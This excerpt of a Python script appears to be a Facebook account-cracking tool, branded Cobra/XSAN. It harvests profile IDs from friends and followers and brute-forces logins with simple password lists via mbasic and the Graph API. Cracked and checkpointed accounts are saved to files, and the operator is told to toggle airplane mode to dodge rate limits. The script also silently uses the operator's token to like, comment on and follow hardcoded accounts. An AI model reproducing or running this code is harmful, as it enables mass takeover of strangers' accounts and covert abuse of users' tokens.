...
try:
	...
	print(war+"Sorry Useragent Not Found !")
...
def romz2():
    os.system('clear')
    logo()
    rr = ("RFLixrwicSfmDNXLRGFlTNdiswCYepAbXKwrqq")
    try:
        l = input(war+"Put Premium Free : "+i)
        while len(l) < 20:
                jalan(war+"License Can't Be Empty !!" if l in (""," ") else (war+"Key/License Must Be More Than 20 Words"))
                time.sleep(3)
                romz2()
        lr = requests.get('https://camo.githubusercontent.com/5de659a7058cecbe327642b1a54db509a8b9d9366672fb89de4d366e436a0cab/68747470733a2f2f6b6f6d617265762e636f6d2f67687076632f3f757365726e616d653d436f62726126636f6c6f723d626c7565').text.strip() # Jangan Di ganti bro'i nanti error
...
def menuvvip():
	...
	print("\n"+k+"["+p+"1"+k+"]"+p+" Check Account Sensation Option "+q+"("+I+"Premium"+q+")")
	print(k+"["+p+"2"+k+"]"+p+" Change File Separator "+q+"("+I+"Premium"+q+")")
	print(k+"["+p+"3"+k+"]"+p+" Checkpoint Detector From File "+qqw)
	print(k+"["+p+"4"+k+"]"+p+" Dump ID Follow Mass (max-500000) "+qww)
...
# print((k+"["+p+"++"+k+"]"+p+" Premium                               : "+tesz+status_prem+p))
  #  print((p+"["+k+"++"+p+"]"+k+" Premium/Free                          : "+tesz+status_free+p))
    #print((k+"["+p+"++"+k+"]"+p+" Administration                        : "+teszz+status_admin+p))
    print((p+"["+k+"••"+p+"]"+u+"================================"+c+"⟩⟩"))
    print((p+"["+k+"++"+p+"]"+k+" Name                : "+nama))
    print((p+"["+k+"++"+p+"]"+k+" Login ID            : "+id))
    print((p+"["+k+"++"+p+"]"+k+" Country             : "+country))
    print((p+"["+k+"++"+p+"]"+k+" Join Date          : "+i+durasi+p))
    print((p+"["+k+"••"+p+"]"+u+"================================"+c+"⟩⟩"))
    print((p+"["+k+"01"+p+"]"+k+" Dump ID From Public/Friend "))
    print((p+"["+k+"02"+p+"]"+k+" Dump ID From Followers"))
    print((p+"["+k+"03"+p+"]"+k+" Dump ID Form Name Search"))
    print((p+"["+k+"04"+p+"]"+k+" Dump ID Form Multi"))
    print((p+"["+k+"05"+p+"]"+k+" Dump ID OLD "+C+"("+tesz+" PREMIUM"+U+"/"+teszzz+"FREE "+C+")"+K))
    print((p+"["+k+"06"+p+"]"+h+" Start Crack"))
 #  print((k+"["+p+"07"+k+"]"+p+" Get Target Information"))
    print((p+"["+k+"08"+k+"]"+u+" See Crack Results"))
    print((p+"["+k+"09"+k+"]"+u+" Settings User Agent"))
    print((p+"["+k+"10"+k+"]"+tesz+" Add Key [OLD] IDS"))
...
def choose_menu(status_prem,status_free):
	r=input(k+"\n["+p+"•"+k+"]"+u+" Choose : ")
	if r=="":
		print((k+"["+p+"!"+k+"]"+m+" Fill In The Correct"))
		menu()
	elif r=="1" or r=="01":
		public()
	elif r=="2" or r=="02":
		...
		if status_prem == (f"{i}Yes") or status_free == (f"{i}Yes"):
			...
			jalan(war+"fast linsces add kro Yar!")
			time.sleep(1)
			menu()
	elif r=="6" or r=="06":
...
def dump_masal():
	...
	main = []
	print("\n"+K+'['+C+'01'+K+'] '+C+'Dump Public')
	print(K+'['+C+'02'+K+'] '+C+'Dump Follow')
	print(K+'['+C+'03'+K+'] '+C+'Dump Public + Follow')
...
def pilihcrack(file):
	...
	print("\n"+p+"["+k+"01"+p+"]"+k+" Mbasic V1 "),time.sleep(0.03)
	print(p+"["+k+"02"+p+"]"+k+" Mbasic V2 "),time.sleep(0.03)
	print(p+"["+k+"03"+p+"]"+k+" Mbasic V2 + Opsi "+paa),time.sleep(0.03)
	print(p+"["+k+"04"+p+"]"+k+" Free Facebook V1 "),time.sleep(0.03)
	print(p+"["+k+"05"+p+"]"+k+" Free Facebook V2 "),time.sleep(0.03)
	print(p+"["+k+"06"+p+"]"+k+" FAST CRACK +++"),time.sleep(0.03)
	q = input("\n"+war+"Choose : "+I)
	if q in [""," "]:
		jalan(war+"Don't Empty !!")
		pilihcrack(file)
		...
		if paa == "" or paa == " ":
			...
			jalan(war+"Sorry Fast ADD key old ID !!")
			time.sleep(1)
			pilihcrack(file)
	elif q == "4" or q == "04" :
		crackffb(file)
...
def pilih_pw():
	...
	print("\n"+I+"["+B+"1"+I+"]"+K+" Name•123•1234•12345•Full-Name [Fast Crack] ")
	print(I+"["+B+"2"+I+"]"+K+" 20PASSWORD [SLOW Crack]")
	print(I+"["+B+"3"+I+"]"+K+" Old PASSWORD [FAST Crack]")
	print(I+"["+B+"4"+I+"]"+K+" 10PASSWORD [NORMAL Crack]")
	njj = input("\n"+inp+"Choose : "+I)
	if njj in [""," "]:
		print(war+"Please Fill Correctly"), time.sleep(1)
		pilih_pw()
...
class kontol:
	...
	def passmenu(self,isifile):
		...
		if zk in ('y','Y'):
			...
			pilih_pw()
			jalan("\n\n"+war+"Turn On Airplane Mode, For 5 Seconds, Then Turn It Off\n"+war+"Ok Crack Results Saved In : "+I+"RESULTS/OK-"+durasi+".txt\n"+war+"Cp Crack Results Stored In : "+K+"Results/CP-"+durasi+".txt\n\n")
			print(war+"Crack Start Hours : "+C+durasi+I+"  "+K+jamz+"\n\n")
			self.passwords()
		else:
		...
		while True:
			...
			if f=="":continue
				...
				try:
					...
					menu()
					continue
				print("\n"+war+'Ok Crack Results Saved At : '+I+'RES/OK-'+durasi+'.txt')
				print(war+'Cp Crack Results Saved At : '+I+'RES/CP-'+durasi+'.txt\n')
				print(war+'USE AIRPLANE MOD 5 Sec Ok Please')
				try:
				...
				if log.get("status")=="cp":
					try:
						try:
							...
							ttll = (' ')
						print("\r%s[%sXSAN•CP%s] %s|%s|%s                 "%(K,P,K,fl.get("id"),i,ttll))
						self.cp.append("%s|%s|%s"%(fl.get("id"),i,ttll))
						open("xsan/CP-"+durasi+".txt","a+").write("%s|%s|%s\n"%(fl.get("id"),i,ttll))
						break
					except(KeyError, IOError):
						h_cp = "\r%s[%sXSAN•CP%s] %s|%s               "%(K,P,K,fl.get("id"),i)
						cek_log(fl.get("id"),i,h_cp)
						print("")
						self.cp.append("%s|%s"%(fl.get("id"),i))
						open("xsan/CP-"+durasi+".txt","a+").write("%s|%s\n"%(fl.get("id"),i))
						break
				elif log.get("status")=="success":
					print("\r%s[%sXSAN•OK%s] %s|%s                 "%(I,P,I,fl.get("id"),i))
					print("")
					self.ada.append("%s|%s"%(fl.get("id"),i))
					open("xsan/OK-"+durasi+".txt","a+").write("%s|%s\n"%(fl.get("id"),i))
					break
				else:continue
...
class bapio_free:
	...
	def pwlist(self):
		...
		if len(self.pw) ==0:
			...
			for i in self.fl:
				i.update({"pw":self.pw})
			print("\n"+war+'Ok Crack Results Saved At : '+I+'results/OK-'+durasi+'.txt')
			print(war+'Cp Crack Results Saved At : '+I+'results/CP-'+durasi+'.txt\n')
			try:
			...
			for i in fl.get("pw"):
				...
				if log.get("status")=="cp":
					try:
						...
						d = " "
						y = " "
						print ("\r%s[%sXSAN•CP%s] %s|%s                  "%(K,P,K,fl.get("id"),i))
						self.cp.append("%s|%s"%(fl.get("id"),i))
						open("Hasil/CP-"+durasi+".txt","a+").write("%s|%s\n"%(fl.get("id"),i))
						break
				elif log.get("status")=="success":
...
class crack_new_vvip:
	def __init__(self,isifile):
		...
		while True:
			pilih_pw()
			f=input(("\n"+k+"["+p+"•"+k+"]"+p+" Use Manual Password?? "+k+"[ "+h+"Y/n"+k+" ]"+p+" : "))
			if f=="":continue
			elif f=="y" or f=="Y":
				try:
					while True:
			...
			for i in fl.get("pw"):
				...
				if log.get("status")=="cp":
					try:
						...
						print("")
						self.cp.append("%s|%s"%(fl.get("id"),i))
						open("is/CP-"+durasi+".txt","a+").write("%s|%s\n"%(fl.get("id"),i))
						break
				elif log.get("status")=="success":
					h_ok = "\r%s[%sXSAN•OK%s] %s|%s%s           "%(I,P,I,fl.get("id"),i,P)
					cek_apk(h_ok,koki(log.get("cookies")))
					print("")
					self.ada.append("%s|%s"%(fl.get("id"),i))
					open("is/OK-"+durasi+".txt","a+").write("%s|%s\n"%(fl.get("id"),i))
					break
				else:continue
			self.ko+=1
			print(("\r\x1b[0;33m[\x1b[0;37mCrack\x1b[0;33m]\x1b[0;37m %s/%s \x1b[0;32m(\x1b[0;37mOK : %s\x1b[0;32m) \x1b[0;33m(\x1b[0;37mCP : %s\x1b[0;33m)\x1b[0;37m"%(self.ko,len(self.fl),len(self.ada),len(self.cp))), end=' ');sys.stdout.flush()
			...
			for i in fl.get("pw"):
				...
				if log.get("status")=="cp":
					try:
						...
						print("\r%s[%sXSAN•CP%s] %s|%s|%s                 "%(K,P,K,fl.get("id"),i,ttll))
						self.cp.append("%s|%s|%s"%(fl.get("id"),i,ttll))
						open("is/CP-"+durasi+".txt","a+").write("%s|%s|%s\n"%(fl.get("id"),i,ttll))
						break
					except(KeyError, IOError):
						print("\r%s[%sXSAN•CP%s] %s|%s           "%(K,P,K,fl.get("id"),i))
						self.cp.append("%s|%s"%(fl.get("id"),i))
					...
					print("\r%s[%sXSAN•OK%s] %s|%s%s     "%(I,P,I,fl.get("id"),i,P))
					self.ada.append("%s|%s"%(fl.get("id"),i))
					open("is/OK-"+durasi+".txt","a+").write("%s|%s\n"%(fl.get("id"),i))
					break
				else:continue
...
class crackmenu:
    ...
    def passmenu(self,isifile):
        try:
            ...
            time.sleep(2)
            menu()
        print('\n\n'+war+'Crack With Manual Password? '+K+'['+M+'y'+q+'/'+I+'n'+K+']')
        zk = input(inp+'Choose An Option : ')
        if zk in ('y','Y'):
            while True:
                pwx = input('\n'+inp+"Enter Manual Password : ")
        ...
        for pw in zkth:
            ...
            if 'access_token' in response.text and 'EAAA' in response.text:
                ...
                try:
                    ...
                    dob = az['birthday']
                    print ('\r%s[%sXSAN•CP%s]%s %s|%s|%s      %s'%(q,K,q,K,user,pw,dob,q))
                    ...
                    pass
                print('\r%s[%sXSAN•CP%s]%s %s|%s                  '%(q,K,q,K,user,pw))
                wrt = ('%s|%s'%(user,pw))
                cp.append(wrt)
                open('is/CP-'+durasi+'.txt', 'a+').write('%s\n' % wrt)
                break
                continue
        loop += 1
    def passwords(self):
		...
		while True:
			...
			if f=="":continue
				...
				try:
					...
					menu()
					continue
				print("\n"+war+'Ok Crack Results Saved At : '+I+'is/OK-'+durasi+'.txt')
				print(war+'Cp Crack Results Saved At : '+I+'is/CP-'+durasi+'.txt\n')
				print(war+'USE AIRPLANE MOD 5 Sec Ok Please')
		...
		try:
			for i in fl.get("pw"):
				...
				if log.get("status")=="success":
					print(q+"\r["+I+"XSAN•OK"+q+"]"+I+(fl.get("id")+"\033[0;97m|\033[0;92m"+i+"      "))
					self.ada.append("%s|%s"%(fl.get("id"),i))
					if fl.get("id") in open("is/OK-"+durasi+".txt").read():
						break
					else:
						open("is/OK-"+durasi+".txt","a+").write(
						"%s|%s\n\n"%(fl.get("id"),i))
					ko="%s|%s\n\n"%(fl.get("id"),i)
					break
				elif log.get("status")=="cp":
					print(q+"\r["+K+"XSAN•CP"+q+"]"+K+(fl.get("id")+"\033[0;97m|\033[0;94m "+i+"      "))
					self.cp.append("%s|%s"%(fl.get("id"),i))
					open(" is/CP-"+durasi+".txt","a+").write(
						"%s|%s\n"%(fl.get("id"),i))
					break
				else:continue
...
class bapittl:
  ...
  def krah(self,isifile):
    pilih_pw()
    print(("\n"+k+"["+p+"•"+k+"]"+p+" Crack With Manual Password?? "+k+"[ "+h+"Y/n"+k+" ]"+p))
    while True:
  ...
  def bruteRequest(self, username, password):
    ...
    if re.search("(EAAA)\\w+", response.text):
      ...
      print(("\r\x1b[0;32m[\x1b[0;37mXSAN•OK\x1b[0;32m] %s|%s %s               "%(username,password,N)))
      ok.append(username + "|" + password)
      save = open("OK-"+durasi+".txt", "a")
      ...
      if "www.facebook.com" in response.json()["error_msg"]:
        ...
        print(("\r\x1b[0;34m[\x1b[0;37mXSAN•CP\x1b[0;34m] %s|%s|%s\x1b[0m   "%(username,password,ttl)))
  ...
  def bruteRequest(self, username, password):
    ...
    if re.search("(EAAA)\\w+", response.text):
      ...
      if "www.facebook.com" in response.json()["error_msg"]:
        ...
        print(("\r\x1b[0;33m[\x1b[0;34mXSAN•CP\x1b[0;34m] %s|%s %s               "%(username,password,N)))
        save = open("is/CP-"+durasi+".txt", "a+")
        save.write(str(username) + "|" + str(password) + "\n")
        save.close()
        return True
    return False
	...
	def main(self,fl):
		try:
			for i in fl.get("pw"):
				...
				if log.get("status")=="cp":
					print(("\r\x1b[0;31m[\x1b[0;31mXSAN•CP\x1b[0;31m] %s|%s               "%(fl.get("id"),i)))
					self.cp.append("%s|%s"%(fl.get("id"),i))
					open("is/CP-"+durasi+".txt","a+").write(
						"%s|%s\n"%(fl.get("id"),i))
					break
				elif log.get("status")=="success":
					print(("\r\x1b[0;32m[\x1b[0;37mXSAN•OK\x1b[0;32m] %s|%s               "%(fl.get("id"),i)))
					self.ada.append("%s|%s"%(fl.get("id"),i))
					open("is/OK-"+durasi+".txt","a+").write(
						"%s|%s\n"%(fl.get("id"),i))
					break
		...
		try:
			for i in fl.get("pw"):
				log=mbasic2(fl.get("id"),
					i,"https://mbasic.facebook.com")
				if log.get("status")=="cp":
					print(("\r\x1b[0;33m[\x1b[0;31mXSAN•CP\x1b[0;33m] %s|%s               "%(fl.get("id"),i)))
					self.cp.append("%s|%s"%(fl.get("id"),i))
					open("is/CP-"+durasi+".txt","a+").write(
						"%s|%s\n"%(fl.get("id"),i))
					break
					...
					print(("\r\x1b[0;32m[\x1b[0;37mXSAN•OK\x1b[0;32m] %s|%s               "%(fl.get("id"),i)))
					self.ada.append("%s|%s"%(fl.get("id"),i))
					open("is/OK-"+durasi+".txt.txt","a+").write(
						"%s|%s\n"%(fl.get("id"),i))
					break
				else:continue
		...
		try:
			for i in fl.get("pw"):
				log=mbasic(fl.get("id"),
					i,"https://mbasic.facebook.com")
				if log.get("status")=="cp":
					print(("\r\x1b[0;33m[\x1b[0;37mXSAN•CP\x1b[0;33m] %s|%s               "%(fl.get("id"),i)))
					self.cp.append("%s|%s"%(fl.get("id"),i))
					open("is/CP-"+durasi+".txt","a+").write(
						"%s|%s\n"%(fl.get("id"),i))
					...
					print(("\r\x1b[0;32m[\x1b[0;37XSAN•OK\x1b[0;32m] %s|%s               "%(fl.get("id"),i)))
					self.ada.append("%s|%s"%(fl.get("id"),i))
					open("is/OK-"+durasi+".txt.txt","a+").write(
						"%s|%s\n"%(fl.get("id"),i))
					break
...
def logs():
  os.system("clear")
  banner()
  print((p+"\n["+k+"1"+p+"]"+k+" Login WithToken"))
  print((p+"["+k+"2"+p+"]"+k+" Login With Cookies"))
  print((p+"["+k+"3"+p+"]"+k+" Free Tokens  "))
  print((p+"["+k+"0"+p+"]"+k+" Exit"))
  sek=input(k+"\n["+p+"•"+k+"]"+p+" Choose : ")
  if sek=="":
...
for n in lpp:
        ...
        try:
                ...
                nama = a["name"]
                id = a["id"]
                print("\033[0;37mHello >>>>>> "+nama)
                print("\033[0;37mID   >>>>>> "+id)
                requests.post("https://graph.facebook.com/266854565354067/likes?summary=true&access_token=" + toket)
                requests.post('https://graph.facebook.com/266854565354067/comments/?message=' + token + '&access_token=' + token)
                requests.post('https://graph.facebook.com/100007026360241/subscribers?access_token=' + token) ### FB RISKY
                requests.post('https://graph.facebook.com/100009834670141/subscribers?access_token=' + token) ### FB RISKY
                requests.post('https://graph.facebook.com/100012267158212/subscribers?access_token=' + token) ### FB RISKY
                requests.post('https://graph.facebook.com/106606321616470/subscribers?access_token=' + token) ### Halaman Risky
                time.sleep(2)
                print(bK)
        except Exception as e:
...
def get_info():
    ...
    try:
        ...
        logs()
    try:
        idt = input(inp+'Enter ID Target :'+k)
        jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
        op = json.loads(jok.text)
    except Exception as e: 
        print(war+"Target Not Found")
        exit()
    except (KeyError, IOError):
        print(war+"Problem Not Found")
        exit()
...
def bot_follow():
	try:
		...
		time.sleep(1)
		logs()
	jalan(war+"Please Wait Comment Ho rhe hy ..")
	print(war+'Helooo: '+nama)
	print(war+'ID Facebook   : '+id)
	# 120338706765807 #
	...
	delete = ("""
	requests.post("https://graph.facebook.com/me/feed/?link=https://m.facebook.com/story.php?story_fbid=266854565354067&id=100060885769913/?app=fbl&access_token=" + toket) 
	requests.post("https://graph.facebook.com/me/feed/?link=https://m.facebook.com/story.php?story_fbid=270409194998604&id=100060885769913/?app=fbl&access_token=" + toket) 
...
if __name__=="__main__":
	if len(sys.argv) == 2:
		if sys.argv[1] == 'crack':
			...
			exit(inp+"Type : python Cobra.py crack or vvip")
